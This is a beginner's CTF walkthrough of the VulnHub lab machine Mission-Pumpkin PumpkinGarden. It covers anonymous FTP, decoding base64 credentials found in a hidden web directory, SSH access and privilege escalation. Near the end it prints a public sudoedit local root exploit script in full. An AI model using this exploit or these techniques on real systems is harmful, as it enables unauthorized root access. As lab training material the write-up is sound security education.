## Mission-Pumpkin v1.0: PumpkinGarden

The series took my eye on vulnhub, so I decided to [check them out.](https://www.vulnhub.com/?q=pumpkin) 

*[Image: Image]*

### Finding out the IP-Adress

This time it was very easy: the vm itself showed it on the welcome screen.

The IP I had to deal with was 192.168.178.59

### Looking for open doors

I fired up Zenmap (yeah I know, but I really like the GUI) to take a closer look at open ports.
*[Image: img]*

### FTP-Server

So there is nothing but a ftp-server. Let's check it out.

vsftp (very secure ftp) supports often an anonymous login. Thats what I tried first:

*[Image: img]*

Because I never worked with ftp like this before i messed up with the commands a little.
But in the end I got what I wanted.

*[Image: img]*

That note.txt said:
```markdown
Hello Dear! 
Looking for route map to PumpkinGarden? I think jack can help you find it.
````
Who the heck is Jack?
Maybe this is a username or something like that. I'll save that for later.

### Are there any other open ports?

Because I didn't know what to search for, I decided to fire up Zenmap again, but this time with a larger portrange.
Bingo!
*[Image: img]*

Now I got a fileserver, a webserver and ssh. Thats a step forward. 

### Webserver

Let's check out the webserver.
*[Image: img]*

It says `the route map to PumpkinGarden is somewhere under the hood`. 

That made me take a closer look at the sourcecode.

*[Image: img]*

That went well. But what does it mean? This ist an absolute beginner vm, so I didn't expect it's talking about steganography.
I took a closer look at the image, but found nothing. Except the path where it is stored.
`192.168.178.59:1515/images`
*[Image: img]*

`hidden_secret` sounds good. After opening that directory, I found a textfile (clue.txt).

*[Image: img]*

That looks like a hash or some other type of decoded text. I ran it through hash-identifier, but there were no results.
Next possibility that came to my mind was base64.

`echo c2NhcmVjcm93IDogNVFuQCR5 | base64 -d`

Voilá `scarecrow : 5Qn@$y`

That looks like a set of credentials. 

### SSH

Maybe they work for SSH?

*[Image: img]*

Oh yes, they do. First big step is done, were inside of the vm.

After running the `ls -la` Command, I recognized a file called note.txt.
*[Image: img]*

Goblin? What for a goblin? Is this another username for ssh?
A quick check of `/etc/passwd` revealed that I assumed this correctly.
*[Image: img]*

Let's try if that awkward string is the password for goblin.
*[Image: img]*

I'm running `ls -la` again and was presented with another note.txt.
*[Image: img]*

### Privilege escalation

That sounds very good, but unfortunately it was a dead end because the site threw up a 404 Error.
Damn! After a couple of minutes spending on google I found out that this exploit was a bash script, which escalates our privileges to root.
Here's the script:
````
#!/bin/sh
# Tod Miller Sudo 1.6.x before 1.6.9p21 and 1.7.x before 1.7.2p4
# local root exploit
# March 2010
# automated by kingcope
# Full Credits to Slouching
echo Tod Miller Sudo local root exploit
echo by Slouching
echo automated by kingcope
if [ $# != 1 ]
then
echo "usage ./sudoxpl.sh <file you have permission to edit>"
exit
fi
# cd /tmp
cat > sudoedit << _EOF
#!/bin/sh
echo ALEX-ALEX
su
/bin/su
/usr/bin/su
_EOF
chmod a+x ./sudoedit $1
````
I went to `/tmp` to create the file and run it, but it didn't work.

Why? Maybe I should run this as scarecrow.

Nope, that won't work eiter. But what now?

I logged in again as goblin an run `ps -aux` which shows all current running processes.

There was a damn script running, which empties `/tmp` and `/home/goblin` every 15 seconds.

Ok, I had to create the script, change the permissions that I could execute it and run it within 15 secs.

I needed a few tries, but with the correct commands in my bash history I could accomplish that.

*[Image: img]*

# BAM there it is: the root shell!

Running `ls -la` again showed me that there is a PumpkinGarden_Key file.
*[Image: img]*

This is a base64 string again. So i echoed it into the base64 decoder.

*[Image: img]*

That's it! I really had fun with that box! Can't wait to take a closer look at part II of the series.

Thank you for reading and happy pwning!

Contact -> [Twitter](https://twitter.com/_the_someone)
